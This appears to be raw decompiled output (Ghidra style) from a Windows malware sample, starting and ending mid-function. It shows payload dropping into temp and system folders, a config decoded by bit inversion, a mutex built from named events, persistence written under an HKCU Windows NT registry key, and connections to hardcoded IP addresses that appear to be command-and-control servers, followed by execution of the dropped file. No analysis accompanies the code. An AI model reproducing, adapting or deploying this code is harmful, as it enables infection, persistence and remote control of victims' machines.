  RegisterClassExW(&local_34);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_00401270(HINSTANCE param_1)

{
  short sVar1;
  undefined2 uVar2;
  undefined4 *puVar3;
  HWND pHVar4;
  int iVar5;
  undefined4 *puVar6;
  HANDLE pvVar7;
  undefined local_3e0 [400];
  short local_250;
  undefined local_24e [518];
  short local_48;
  undefined local_46 [58];
  uint local_c;
  
  local_c = DAT_00420044 ^ (uint)&stack0xfffffffc;
  DAT_004227d0 = param_1;
  pHVar4 = CreateWindowExW(0,(LPCWSTR)&DAT_00422640,(LPCWSTR)&DAT_00422708,0xcf0000,-0x80000000,0,
                           -0x80000000,0,(HWND)0x0,(HMENU)0x0,param_1,(LPVOID)0x0);
  if (pHVar4 != (HWND)0x0) {
    local_250 = 0;
    _memset(local_24e,0,0x206);
    Ordinal_115(0x101,local_3e0);
    iVar5 = FUN_00406140(1);
    if (iVar5 == 0) {
      local_48 = 0;
      _memset(local_46,0,0x3a);
      FUN_00401600();
      iVar5 = 0;
      do {
        sVar1 = *(short *)(local_46 + iVar5 + -2);
        *(short *)((int)&DAT_00423138 + iVar5) = sVar1;
        iVar5 = iVar5 + 2;
      } while (sVar1 != 0);
      _wcscpy_s((wchar_t *)&DAT_00422f94,0x40,&DAT_0041c288);
      DAT_00423014 = 0x51;
      _wcscpy_s(&DAT_00423016,0x10,&DAT_0041c2a4);
      _wcscpy_s((wchar_t *)&DAT_00423036,0x40,&DAT_0041c2b0);
      DAT_004230b6 = 0x2b66;
      iVar5 = 0;
      do {
        sVar1 = *(short *)(local_46 + iVar5 + -2);
        *(short *)((int)&DAT_00423118 + iVar5) = sVar1;
        uVar2 = DAT_0041c2d0;
        iVar5 = iVar5 + 2;
      } while (sVar1 != 0);
      puVar3 = (undefined4 *)0x423116;
      do {
        puVar6 = puVar3;
        puVar3 = (undefined4 *)((int)puVar6 + 2);
      } while (*(short *)((int)puVar6 + 2) != 0);
      *(undefined4 *)((int)puVar6 + 2) = DAT_0041c2cc;
      *(undefined2 *)((int)puVar6 + 6) = uVar2;
      DAT_00423158 = 5;
    }
    FUN_00402be0();
    FUN_00401600();
    iVar5 = 0;
    do {
      sVar1 = *(short *)(local_24e + iVar5 + -2);
      *(short *)((int)&DAT_00423190 + iVar5) = sVar1;
      iVar5 = iVar5 + 2;
    } while (sVar1 != 0);
    pvVar7 = OpenEventW(0x20000,0,&DAT_00423190);
    if (pvVar7 == (HANDLE)0x0) {
      pvVar7 = CreateEventW((LPSECURITY_ATTRIBUTES)0x0,0,0,&DAT_00423190);
      if (pvVar7 != (HANDLE)0x0) {
        FUN_00402a30();
        _DAT_00423628 = DAT_0042315c;
        _DAT_004214bc =
             CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_00402c90,(LPVOID)0x0,0,(LPDWORD)0x0);
        ___security_check_cookie_4(local_c ^ (uint)&stack0xfffffffc);
        return;
      }
    }
    else {
      CloseHandle(pvVar7);
    }
  }
  ___security_check_cookie_4(local_c ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_004014a0(HWND param_1,UINT param_2,uint param_3,LPARAM param_4)

{
  undefined auStack_54 [4];
  tagPAINTSTRUCT local_50;
  uint local_c;
  
  local_c = DAT_00420044 ^ (uint)auStack_54;
  if (param_2 == 2) {
    PostQuitMessage(0);
    ___security_check_cookie_4(local_c ^ (uint)auStack_54);
    return;
  }
  if (param_2 == 0xf) {
    BeginPaint(param_1,&local_50);
    EndPaint(param_1,&local_50);
    ___security_check_cookie_4(local_c ^ (uint)auStack_54);
    return;
  }
  if (param_2 != 0x111) {
    DefWindowProcW(param_1,param_2,param_3,param_4);
    ___security_check_cookie_4(local_c ^ (uint)auStack_54);
    return;
  }
  if ((param_3 & 0xffff) != 0x68) {
    if ((param_3 & 0xffff) != 0x69) {
      DefWindowProcW(param_1,0x111,param_3,param_4);
      ___security_check_cookie_4(local_c ^ (uint)auStack_54);
      return;
    }
    DestroyWindow(param_1);
    ___security_check_cookie_4(local_c ^ (uint)auStack_54);
    return;
  }
  DialogBoxParamW(DAT_004227d0,(LPCWSTR)0x67,param_1,FUN_004015c0,0);
  ___security_check_cookie_4(local_c ^ (uint)auStack_54);
  return;
}



undefined4 FUN_004015c0(HWND param_1,int param_2,ushort param_3)

{
  if (param_2 == 0x110) {
    return 1;
  }
  if ((param_2 == 0x111) && ((param_3 == 1 || (param_3 == 2)))) {
    EndDialog(param_1,(uint)param_3);
    return 1;
  }
  return 0;
}



void FUN_00401600(void)

{
  wchar_t wVar1;
  wchar_t *pwVar2;
  wchar_t *pwVar3;
  int iVar4;
  int unaff_EDI;
  WCHAR local_210;
  undefined local_20e [518];
  uint local_8;
  
  local_8 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  local_210 = L'\0';
  _memset(local_20e,0,0x206);
  GetModuleFileNameW((HMODULE)0x0,&local_210,0x104);
  pwVar2 = _wcsrchr(&local_210,L'\\');
  *pwVar2 = L'\0';
  pwVar2 = pwVar2 + 1;
  pwVar3 = _wcsrchr(pwVar2,L'.');
  *pwVar3 = L'\0';
  iVar4 = unaff_EDI - (int)pwVar2;
  do {
    wVar1 = *pwVar2;
    *(wchar_t *)(iVar4 + (int)pwVar2) = wVar1;
    pwVar2 = pwVar2 + 1;
  } while (wVar1 != L'\0');
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe

void FUN_004016a0(void)

{
  short *psVar1;
  WCHAR WVar2;
  wchar_t wVar3;
  short sVar4;
  int iVar5;
  undefined4 *puVar6;
  int iVar7;
  int iVar8;
  uint uVar9;
  DWORD DVar10;
  WCHAR *pWVar11;
  undefined4 *puVar12;
  HANDLE pvVar13;
  int iVar14;
  LSTATUS LVar15;
  wchar_t *pwVar16;
  code *pcVar17;
  int local_1c50;
  HKEY local_1c48 [2];
  int local_1c40;
  uint local_1c3c;
  uint local_1c38;
  undefined local_1c34 [4];
  short asStack_1c30 [64];
  ushort local_1bb0;
  short asStack_1bae [80];
  ushort local_1b0e;
  undefined local_1a34 [8];
  int local_1a2c;
  wchar_t local_1a0c [108];
  uint local_1934;
  ushort local_1930;
  uint local_192e;
  ushort local_192a;
  short asStack_1926 [16];
  wchar_t local_1906 [133];
  int local_17fc;
  wchar_t local_17f8 [64];
  ushort local_1778;
  wchar_t local_1776 [16];
  wchar_t local_1756 [64];
  ushort local_16d6;
  wchar_t local_16d4 [16];
  wchar_t local_16b4 [16];
  wchar_t local_1694 [16];
  wchar_t local_1674 [16];
  wchar_t local_1654 [16];
  int local_1634;
  undefined4 local_1630;
  wchar_t local_15fc;
  undefined local_15fa [2046];
  WCHAR local_dfc;
  undefined local_dfa [518];
  wchar_t local_bf4;
  undefined local_bf2 [516];
  undefined4 uStack_9ee;
  undefined auStack_9ea [518];
  WCHAR local_7e4;
  undefined local_7e2 [518];
  WCHAR local_5dc;
  undefined local_5da [6];
  int local_5d4 [128];
  WCHAR local_3d4;
  undefined local_3d2 [518];
  wchar_t local_1cc;
  undefined local_1ca [126];
  wchar_t local_14c;
  undefined local_14a [126];
  wchar_t local_cc;
  undefined local_ca [130];
  wchar_t local_48;
  undefined4 local_46;
  undefined4 local_42;
  undefined4 local_3e;
  undefined4 local_3a;
  undefined4 local_36;
  undefined4 local_32;
  undefined4 local_2e;
  undefined2 local_2a;
  wchar_t local_28;
  undefined4 local_26;
  undefined4 local_22;
  undefined4 local_1e;
  undefined4 local_1a;
  undefined4 local_16;
  undefined4 local_12;
  undefined4 local_e;
  undefined2 local_a;
  uint local_8;
  
  local_8 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  local_3d4 = L'\0';
  _memset(local_3d2,0,0x206);
  local_dfc = L'\0';
  _memset(local_dfa,0,0x206);
  local_bf4 = L'\0';
  _memset(local_bf2,0,0x206);
  local_28 = L'\0';
  local_26 = 0;
  local_22 = 0;
  local_1e = 0;
  local_1a = 0;
  local_16 = 0;
  local_12 = 0;
  local_e = 0;
  local_a = 0;
  local_1cc = L'\0';
  _memset(local_1ca,0,0x7e);
  local_cc = L'\0';
  _memset(local_ca,0,0x7e);
  local_1c3c = 0;
  local_14c = L'\0';
  _memset(local_14a,0,0x7e);
  local_1c38 = 0;
  local_7e4 = L'\0';
  _memset(local_7e2,0,0x206);
  local_48 = L'\0';
  local_46 = 0;
  local_42 = 0;
  local_3e = 0;
  local_3a = 0;
  local_36 = 0;
  local_32 = 0;
  local_2e = 0;
  local_2a = 0;
  local_1c50 = 0;
  _memset(&local_17fc,0,0x200);
  iVar7 = FUN_00406140(1);
  _memset(local_5d4,0,0x200);
  iVar8 = FUN_00405f60();
  if (iVar8 == 0) {
    local_1c40 = 0;
  }
  else {
    uVar9 = 0;
    do {
      *(byte *)((int)local_5d4 + uVar9) = ~*(byte *)((int)local_5d4 + uVar9);
      uVar9 = uVar9 + 1;
    } while (uVar9 < 0x200);
    if (local_5d4[0] == 0x504d534d) {
      FID_conflict__memcpy(local_1c34,local_5d4,0x200);
      local_1c40 = 1;
    }
    else {
      local_1c40 = 0;
    }
  }
  GetModuleFileNameW((HMODULE)0x0,&local_dfc,0x104);
  pcVar17 = GetTempPathW_exref;
  GetTempPathW(0x104,&local_3d4);
  _wcscat_s(&local_3d4,0x104,u_HGDraw_dll_0041c2d4);
  pWVar11 = &local_3d4;
  do {
    WVar2 = *pWVar11;
    pWVar11 = pWVar11 + 1;
  } while (WVar2 != L'\0');
  if (((int)pWVar11 - (int)local_3d2 >> 1 != 0) &&
     (DVar10 = GetFileAttributesW(&local_3d4), DVar10 != 0xffffffff)) {
    DeleteFileW(&local_3d4);
  }
  if (iVar7 == 0) {
    iVar8 = 0;
    if (DAT_00420f10 == 3) {
      _memset(local_1a34,0,0x236);
      local_1c50 = FUN_00403d70();
      if (local_1c50 != 0) {
        iVar8 = 0;
        do {
          sVar4 = *(short *)((int)asStack_1926 + iVar8);
          *(short *)(local_1ca + iVar8 + -2) = sVar4;
          iVar8 = iVar8 + 2;
        } while (sVar4 != 0);
        FUN_004033a0(local_192e);
        local_1c3c = (uint)local_192a;
        FUN_004033a0(local_1934);
        local_1c38 = (uint)local_1930;
        _wcscpy_s(&local_28,0x10,local_1906);
        iVar8 = local_1a2c;
      }
    }
  }
  else {
    GetTempPathW(0x104,&local_3d4);
    _wcscat_s(&local_3d4,0x104,local_1674);
    _wcscat_s(&local_3d4,0x104,u__exe_0041c2ec);
    pWVar11 = &local_3d4;
    do {
      WVar2 = *pWVar11;
      pWVar11 = pWVar11 + 1;
    } while (WVar2 != L'\0');
    if (((int)pWVar11 - (int)local_3d2 >> 1 != 0) &&
       (DVar10 = GetFileAttributesW(&local_3d4), DVar10 != 0xffffffff)) {
      iVar8 = 0;
      do {
        psVar1 = (short *)((int)local_1674 + iVar8);
        *(short *)((int)local_1a0c + iVar8) = *psVar1;
        iVar8 = iVar8 + 2;
      } while (*psVar1 != 0);
      _wcscat_s(local_1a0c,0x104,u__exe_0041c2ec);
      DeleteFileW(&local_3d4);
    }
    _wcscpy_s(&local_28,0x10,local_1654);
    FUN_00403670();
    iVar8 = FUN_00402180();
    if (iVar8 == 1) {
      ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
      return;
    }
    local_5dc = L'\0';
    _memset(local_5da,0,0x206);
    uStack_9ee._2_2_ = 0;
    _memset(auStack_9ea,0,0x206);
    iVar8 = 0;
    do {
      sVar4 = *(short *)((int)local_1654 + iVar8);
      *(short *)(local_5da + iVar8 + -2) = sVar4;
      iVar8 = iVar8 + 2;
    } while (sVar4 != 0);
    iVar8 = 0;
    do {
      sVar4 = *(short *)((int)local_1654 + iVar8);
      *(short *)(auStack_9ea + iVar8 + -2) = sVar4;
      iVar8 = iVar8 + 2;
    } while (sVar4 != 0);
    puVar6 = &uStack_9ee;
    do {
      puVar12 = puVar6;
      puVar6 = (undefined4 *)((int)puVar12 + 2);
    } while (*(short *)((int)puVar12 + 2) != 0);
    *(undefined4 *)((int)puVar12 + 2) = u__STOP_0041c2f8._0_4_;
    *(undefined4 *)((int)puVar12 + 6) = u__STOP_0041c2f8._4_4_;
    *(undefined4 *)((int)puVar12 + 10) = u__STOP_0041c2f8._8_4_;
    pvVar13 = OpenEventW(0x20000,0,&local_5dc);
    if (pvVar13 != (HANDLE)0x0) {
      CloseHandle(pvVar13);
      CreateEventW((LPSECURITY_ATTRIBUTES)0x0,0,0,(LPCWSTR)((int)&uStack_9ee + 2));
      pvVar13 = OpenEventW(0x20000,0,&local_5dc);
      for (iVar8 = 0; (pvVar13 != (HANDLE)0x0 && (iVar8 < 5)); iVar8 = iVar8 + 1) {
        CloseHandle(pvVar13);
        Sleep(500);
        pvVar13 = OpenEventW(0x20000,0,&local_5dc);
      }
    }
    Sleep(1000);
    DeleteFileW(&local_3d4);
    iVar8 = 0;
    do {
      sVar4 = *(short *)((int)local_1776 + iVar8);
      *(short *)(local_1ca + iVar8 + -2) = sVar4;
      iVar8 = iVar8 + 2;
    } while (sVar4 != 0);
    iVar8 = 0;
    do {
      sVar4 = *(short *)((int)local_17f8 + iVar8);
      *(short *)(local_ca + iVar8 + -2) = sVar4;
      iVar8 = iVar8 + 2;
    } while (sVar4 != 0);
    local_1c3c = (uint)local_1778;
    iVar8 = 0;
    do {
      sVar4 = *(short *)((int)local_1756 + iVar8);
      *(short *)(local_14a + iVar8 + -2) = sVar4;
      iVar8 = iVar8 + 2;
    } while (sVar4 != 0);
    local_1c38 = (uint)local_16d6;
    _wcscpy_s(&local_48,0x10,local_1674);
    iVar8 = local_1634;
    pcVar17 = GetTempPathW_exref;
  }
  if (local_1c40 != 0) {
    iVar8 = 0;
    do {
      sVar4 = *(short *)((int)asStack_1bae + iVar8);
      *(short *)(local_1ca + iVar8 + -2) = sVar4;
      iVar8 = iVar8 + 2;
    } while (sVar4 != 0);
    iVar8 = 0;
    do {
      sVar4 = *(short *)((int)asStack_1c30 + iVar8);
      *(short *)(local_ca + iVar8 + -2) = sVar4;
      iVar8 = iVar8 + 2;
    } while (sVar4 != 0);
    local_1c3c = (uint)local_1bb0;
    iVar8 = 0;
    do {
      sVar4 = *(short *)((int)&DAT_0041c2b0 + iVar8);
      *(short *)(local_14a + iVar8 + -2) = sVar4;
      iVar8 = iVar8 + 2;
    } while (sVar4 != 0);
    local_1c38 = (uint)local_1b0e;
    iVar8 = 5;
    if (DAT_00420f10 == 3) {
      GetSystemDirectoryW(&local_7e4,0x104);
      _wcscat_s(&local_7e4,0x104,(wchar_t *)&DAT_0041c284);
    }
    else {
      (*pcVar17)(0x104,&local_7e4);
    }
    iVar14 = 0;
    do {
      iVar5 = iVar14 + -2;
      *(short *)(local_bf2 + iVar14 + -2) = *(short *)(local_7e2 + iVar5);
      iVar14 = iVar14 + 2;
    } while (*(short *)(local_7e2 + iVar5) != 0);
    _wcscat_s(&local_bf4,0x104,u_golfset_ini_0041c304);
    DeleteFileW(&local_bf4);
  }
  _memset(&local_17fc,0,0x200);
  local_1778 = 0x51;
  local_17fc = 0x504d534d;
  iVar14 = 0;
  do {
    sVar4 = *(short *)((int)&DAT_0041c288 + iVar14);
    *(short *)((int)local_17f8 + iVar14) = sVar4;
    iVar14 = iVar14 + 2;
  } while (sVar4 != 0);
  local_16d6 = 0x2b66;
  iVar14 = 0;
  do {
    sVar4 = *(short *)((int)&DAT_0041c2b0 + iVar14);
    *(short *)((int)local_1756 + iVar14) = sVar4;
    iVar14 = iVar14 + 2;
  } while (sVar4 != 0);
  iVar14 = 0;
  do {
    sVar4 = *(short *)((int)&DAT_0041c2a4 + iVar14);
    *(short *)((int)local_1776 + iVar14) = sVar4;
    iVar14 = iVar14 + 2;
  } while (sVar4 != 0);
  local_1634 = 5;
  if (((iVar7 != 0) || (local_1c50 != 0)) || (local_1c40 != 0)) {
    _wcscpy_s(local_1776,0x10,&local_1cc);
    _wcscpy_s(local_17f8,0x40,&local_cc);
    local_1778 = (short)local_1c3c;
    _wcscpy_s(local_1756,0x40,&local_14c);
    local_16d6 = (undefined2)local_1c38;
    local_1634 = iVar8;
    if (iVar8 == 0) {
      local_1634 = 5;
    }
  }
  if ((local_17f8[0] != L'\0') && (local_1778 != 0)) {
    local_17fc = 0x504d534d;
    DVar10 = GetTickCount();
    FUN_0040a7ab(DVar10);
    local_15fc = L'\0';
    _memset(local_15fa,0,0x7fe);
    if (local_16d4[0] == L'\0') {
      FUN_00402d70((int)&local_15fc);
      _wcscpy_s(local_16d4,0x10,&local_15fc);
    }
    if (local_16b4[0] == L'\0') {
      FUN_00402d70((int)&local_15fc);
      _wcscpy_s(local_16b4,0x10,&local_15fc);
    }
    if (local_1674[0] == L'\0') {
      FUN_00402d70((int)&local_15fc);
      _wcscpy_s(local_1674,0x10,&local_15fc);
    }
    if (local_1654[0] == L'\0') {
      FUN_00402d70((int)&local_15fc);
      _wcscpy_s(local_1654,0x10,&local_15fc);
      pwVar16 = &local_28;
      do {
        wVar3 = *pwVar16;
        pwVar16 = pwVar16 + 1;
      } while (wVar3 != L'\0');
      if ((int)pwVar16 - (int)&local_26 >> 1 != 0) {
        _wcscpy_s(local_1654,0x10,&local_28);
      }
    }
    pwVar16 = &local_48;
    do {
      wVar3 = *pwVar16;
      pwVar16 = pwVar16 + 1;
    } while (wVar3 != L'\0');
    if ((int)pwVar16 - (int)&local_46 >> 1 != 0) {
      _wcscpy_s(local_1694,0x10,&local_48);
    }
    if (local_1694[0] == L'\0') {
      FUN_00402d70((int)&local_15fc);
      _wcscpy_s(local_1694,0x10,&local_15fc);
    }
    local_1630 = 0x1000224;
    if (local_1634 == 0) {
      local_1634 = 5;
    }
    iVar7 = FUN_004061f0(&local_17fc);
    if (iVar7 != 0) {
      pwVar16 = &local_3d4;
      FUN_00403670();
      FUN_00402940(pwVar16);
      local_1c48[0] = (HKEY)0x0;
      LVar15 = RegOpenKeyExW((HKEY)0x80000001,u_Software_Microsoft_Windows_NT_Cu_0041c320,0,3,
                             local_1c48);
      if (LVar15 == 0) {
        do {
          wVar3 = *pwVar16;
          pwVar16 = pwVar16 + 1;
        } while (wVar3 != L'\0');
        LVar15 = RegSetValueExW(local_1c48[0],(LPCWSTR)&DAT_0041c38c,0,1,(BYTE *)&local_3d4,
                                ((int)pwVar16 - (int)local_3d2 >> 1) * 2 + 2);
        if (LVar15 == 0) {
          RegCloseKey(local_1c48[0]);
        }
      }
      ShellExecuteW((HWND)0x0,(LPCWSTR)0x0,&local_3d4,&DAT_0041c400,(LPCWSTR)0x0,1);
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_00402180(void)

{
  wchar_t *unaff_ESI;
  WCHAR local_238;
  undefined local_236 [518];
  wchar_t local_30;
  undefined4 local_2e;
  undefined4 local_2a;
  undefined4 local_26;
  undefined4 local_22;
  undefined4 local_1e;
  undefined4 local_1a;
  undefined4 local_16;
  undefined4 local_12;
  undefined4 local_e;
  undefined2 local_a;
  uint local_8;
  
  local_8 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  local_238 = L'\0';
  _memset(local_236,0,0x206);
  local_2e = 0;
  local_2a = 0;
  local_26 = 0;
  local_22 = 0;
  local_1e = 0;
  local_1a = 0;
  local_16 = 0;
  local_12 = 0;
  local_e = 0;
  local_a = 0;
  local_30 = L'\0';
  _wcscpy_s(&local_30,0x14,unaff_ESI);
  _wcscat_s(&local_30,0x14,u__exe_0041c2ec);
  GetModuleFileNameW((HMODULE)0x0,&local_238,0x104);
  _wcsstr(&local_238,&local_30);
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_00402240(void)

{
  int iVar1;
  int iVar2;
  int iVar3;
  undefined4 uVar4;
  undefined local_18;
  undefined4 local_17;
  undefined4 local_13;
  undefined4 local_f;
  undefined2 local_b;
  undefined local_9;
  uint local_8;
  
  local_8 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  local_17 = 0;
  local_13 = 0;
  local_f = 0;
  local_b = 0;
  local_9 = 0;
  local_18 = 0;
  iVar1 = FUN_00402340(s_218_54_31_226_004214a8,(uint)DAT_004214b8);
  if (iVar1 != 0) {
    if (DAT_00420f10 == 3) {
      uVar4 = 0x2bac;
    }
    else {
      uVar4 = 0x2ba2;
    }
    iVar2 = FUN_00402340(s_1_234_83_146_0041c394,uVar4);
    if (iVar2 != 0) {
      if (DAT_00422e5e != 0) {
        FUN_00403420(DAT_00422e5e);
      }
      iVar3 = FUN_00402340(&local_18,(uint)DAT_004214b8);
      if (iVar3 == 0) {
        ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
        return;
      }
      if (((iVar1 == 1) && (iVar2 == 1)) && (iVar3 == 1)) {
        FUN_00402340(s_133_242_129_155_0041c3a4,(uint)DAT_004214b8);
      }
      ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
      return;
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __thiscall FUN_00402340(void *this,undefined4 param_1)

{
  int iVar1;
  wchar_t *pwVar2;
  int *piVar3;
  uint uVar4;
  undefined *puVar5;
  short *this_00;
  WCHAR local_638 [260];
  wchar_t local_430;
  undefined local_42e [518];
  wchar_t local_228;
  undefined local_226 [518];
  undefined local_20;
  undefined4 local_1f;
  undefined4 local_1b;
  undefined4 local_17;
  undefined4 local_13;
  undefined2 local_f;
  undefined local_d;
  uint local_c;
  
  local_c = DAT_00420044 ^ (uint)&stack0xfffffffc;
  iVar1 = FUN_00405a80(this,param_1);
  if (iVar1 == 0) {
    local_228 = L'\0';
    _memset(local_226,0,0x206);
    local_430 = L'\0';
    _memset(local_42e,0,0x206);
    GetModuleFileNameW((HMODULE)0x0,local_638,0x104);
    pwVar2 = _wcsrchr(local_638,L'\\');
    *pwVar2 = L'\0';
    _wcscpy_s(&local_228,0x104,local_638);
    _wcscat_s(&local_228,0x104,(wchar_t *)&DAT_0041c284);
    local_20 = 0;
    local_1f = 0;
    local_1b = 0;
    local_17 = 0;
    local_13 = 0;
    local_f = 0;
    local_d = 0;
    pwVar2 = &DAT_004227e0;
    puVar5 = &stack0xffbdd6fc;
    do {
      if (*pwVar2 != L'\0') {
        _wcscpy_s(&local_430,0x104,&local_228);
        _wcscat_s(&local_430,0x104,pwVar2);
        iVar1 = FUN_00405030(&local_430);
        if (iVar1 != 0) {
          uVar4 = 0x14;
          piVar3 = (int *)(pwVar2 + 0x82);
          do {
            if (*(int *)(puVar5 + (int)piVar3) != *piVar3) goto LAB_004024a7;
            uVar4 = uVar4 - 4;
            piVar3 = piVar3 + 1;
          } while (3 < uVar4);
          *pwVar2 = L'\0';
        }
      }
LAB_004024a7:
      pwVar2 = pwVar2 + 0x8c;
      puVar5 = puVar5 + -0x118;
    } while ((int)pwVar2 < 0x422d58);
    this_00 = &DAT_004227e0;
    do {
      if (*this_00 != 0) {
        FUN_00405cc0(this_00,this,param_1);
      }
      this_00 = this_00 + 0x8c;
    } while ((int)this_00 < 0x422d58);
    _wcscat_s(&local_228,0x104,(wchar_t *)&DAT_00423418);
    GetFileAttributesW(&local_228);
  }
  ___security_check_cookie_4(local_c ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_00402540(void)

{
  WCHAR WVar1;
  short sVar2;
  short *psVar3;
  HANDLE pvVar4;
  LSTATUS LVar5;
  short *psVar6;
  int iVar7;
  void *pvVar8;
  WCHAR *pWVar9;
  void *dwMilliseconds;
  DWORD local_24c;
  DWORD local_248;
  uint local_244;
  HKEY local_240;
  WCHAR local_23c;
  undefined local_23a [522];
  WCHAR local_30;
  undefined4 local_2e;
  undefined4 local_2a;
  undefined4 local_26;
  undefined4 local_22;
  undefined4 local_1e;
  undefined4 local_1a;
  undefined4 local_16;
  undefined4 local_12;
  undefined4 local_e;
  undefined2 local_a;
  uint local_8;
  
  local_8 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  local_23c = L'\0';
  _memset(local_23a,0,0x206);
  local_2e = 0;
  local_2a = 0;
  local_26 = 0;
  local_22 = 0;
  local_1e = 0;
  local_1a = 0;
  local_16 = 0;
  local_12 = 0;
  local_e = 0;
  local_a = 0;
  local_30 = L'\0';
  local_248 = 0;
  local_24c = 0x104;
  psVar3 = &DAT_004230f8;
  do {
    psVar6 = psVar3;
    psVar3 = psVar6 + 1;
  } while (*psVar6 != 0);
  if (((int)(psVar6 + -0x21187c) >> 1 == 0) ||
     (pvVar4 = OpenEventW(0x20000,0,&DAT_004230f8), pvVar4 == (HANDLE)0x0)) {
    LVar5 = RegOpenKeyExW((HKEY)0x80000001,u_Software_Microsoft_Windows_NT_Cu_0041c320,0,0xf003f,
                          &local_240);
    if (LVar5 == 0) {
      LVar5 = RegQueryValueExW(local_240,u_TrayKey_0041c3b4,(LPDWORD)0x0,&local_248,
                               (LPBYTE)&local_30,&local_24c);
      if ((LVar5 == 0) && (pvVar4 = OpenEventW(0x20000,0,&local_30), pvVar4 != (HANDLE)0x0)) {
        RegCloseKey(local_240);
        ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
        return;
      }
      RegCloseKey(local_240);
    }
    local_244 = 0;
    GetTempPathW(0x104,&local_23c);
    psVar3 = &DAT_00423118;
    do {
      psVar6 = psVar3;
      psVar3 = psVar6 + 1;
    } while (*psVar6 != 0);
    if ((int)(psVar6 + -0x21188c) >> 1 == 0) {
      _wcscat_s(&local_23c,0x104,&DAT_0041c3c4);
      iVar7 = 0;
      do {
        sVar2 = *(short *)((int)&DAT_0041c3c4 + iVar7);
        *(short *)((int)&local_30 + iVar7) = sVar2;
        iVar7 = iVar7 + 2;
      } while (sVar2 != 0);
    }
    else {
      _wcscat_s(&local_23c,0x104,&DAT_00423118);
      iVar7 = 0;
      do {
        sVar2 = *(short *)((int)&DAT_00423118 + iVar7);
        *(short *)((int)&local_30 + iVar7) = sVar2;
        iVar7 = iVar7 + 2;
      } while (sVar2 != 0);
    }
    _wcscat_s(&local_23c,0x104,u__exe_0041c2ec);
    pvVar8 = FUN_00402ea0(&local_244);
    if (pvVar8 != (void *)0x0) {
      dwMilliseconds = pvVar8;
      FUN_004027f0(&local_23c,pvVar8,local_244);
      Sleep((DWORD)dwMilliseconds);
      ShellExecuteW((HWND)0x0,(LPCWSTR)0x0,&local_23c,&DAT_0041c400,(LPCWSTR)0x0,1);
      LVar5 = RegOpenKeyExW((HKEY)0x80000001,u_Software_Microsoft_Windows_NT_Cu_0041c320,0,3,
                            &local_240);
      if (LVar5 == 0) {
        pWVar9 = &local_30;
        do {
          WVar1 = *pWVar9;
          pWVar9 = pWVar9 + 1;
        } while (WVar1 != L'\0');
        LVar5 = RegSetValueExW(local_240,u_TrayKey_0041c3b4,0,1,(BYTE *)&local_30,
                               ((int)pWVar9 - (int)&local_2e >> 1) * 2 + 2);
        if (LVar5 == 0) {
          RegCloseKey(local_240);
        }
      }
      FUN_0040a83e(pvVar8);
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



undefined4 __cdecl FUN_004027f0(LPCWSTR param_1,undefined4 param_2,uint param_3)

{
  DWORD DVar1;
  HANDLE pvVar2;
  void *lpBuffer;
  int iVar3;
  BOOL BVar4;
  uint uVar5;
  undefined4 extraout_ECX;
  undefined4 extraout_EDX;
  undefined4 uVar6;
  undefined4 uVar7;
  ulonglong uVar8;
  undefined4 local_14;
  undefined8 local_10;
  
  local_14 = 0;
  DVar1 = GetFileAttributesW(param_1);
  uVar7 = 0xffffffff;
  if (DVar1 != 0xffffffff) {
    pvVar2 = CreateFileW(param_1,0x80000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
    if (pvVar2 == (HANDLE)0xffffffff) {
      local_10._4_4_ = -1;
    }
    else {
      BVar4 = GetFileSizeEx(pvVar2,(PLARGE_INTEGER)&local_10);
      uVar6 = -1;
      if (BVar4 == 1) {
        uVar6 = local_10._4_4_;
        uVar7 = (undefined4)local_10;
      }
      CloseHandle(pvVar2);
      local_10._4_4_ = uVar6;
    }
    if (uVar7 == param_3) {
      return 1;
    }
  }
  lpBuffer = _malloc(0x200000);
  local_10._4_4_ = 0x200000;
  iVar3 = FUN_00406380(param_3,(void **)((int)&local_10 + 4),param_2,lpBuffer);
  if (iVar3 != 0) {
    DVar1 = GetTickCount();
    FUN_0040a7ab(DVar1);
    param_3 = FUN_0040a7bd();
    uVar8 = FUN_00415ac0(extraout_ECX,extraout_EDX);
    FUN_00403710();
    DVar1 = (int)uVar8 + local_10._4_4_;
    pvVar2 = FUN_00406310();
    if (pvVar2 != (HANDLE)0xffffffff) {
      BVar4 = WriteFile(pvVar2,lpBuffer,DVar1,&param_3,(LPOVERLAPPED)0x0);
      uVar5 = -(uint)(BVar4 != 0) & param_3;
      CloseHandle(pvVar2);
      local_14 = 1;
      if (uVar5 == DVar1) goto LAB_0040292c;
    }
    local_14 = 0;
  }
LAB_0040292c:
  _free(lpBuffer);
  return local_14;
}



undefined4 __cdecl FUN_00402940(wchar_t *param_1)

{
  wchar_t *in_EAX;
  errno_t eVar1;
  size_t _ElementSize;
  void *_DstBuf;
  DWORD DVar2;
  uint uVar3;
  int iVar4;
  FILE *local_8;
  
  local_8 = (FILE *)0x0;
  eVar1 = __wfopen_s(&local_8,in_EAX,(wchar_t *)&DAT_0041c3f0);
  if (eVar1 != 0) {
    return 0;
  }
  _fseek(local_8,0,2);
  _ElementSize = _ftell(local_8);
  _fseek(local_8,0,0);
  _DstBuf = _malloc(_ElementSize + 0x32);
  _fread(_DstBuf,_ElementSize,1,local_8);
  _fclose(local_8);
  _memset((void *)((int)_DstBuf + _ElementSize),0,0x32);
  DVar2 = GetTickCount();
